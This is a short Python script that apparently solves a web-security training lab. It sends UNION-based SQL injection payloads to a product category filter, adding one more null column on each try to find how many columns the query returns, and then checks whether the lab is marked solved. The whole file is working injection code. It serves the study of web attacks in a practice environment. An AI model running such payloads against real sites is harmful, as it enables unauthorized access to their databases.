from base.base import Base
from bs4 import BeautifulSoup

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def _add_args(self):
        pass

    def run(self):
        for i in range(1, 10): # i dont know if it is always 3, so i'll make it dynamic
            response = self.session.get(f"{self.base_url}/filter?category=Gifts' union select null{(i*",null")} -- ") 
            
            self.log(f"Response status code: {response.status_code}", "verbose")

        
        self.is_lab_solved()
        
    

if __name__ == "__main__":
    sql = SQL()
    sql.run()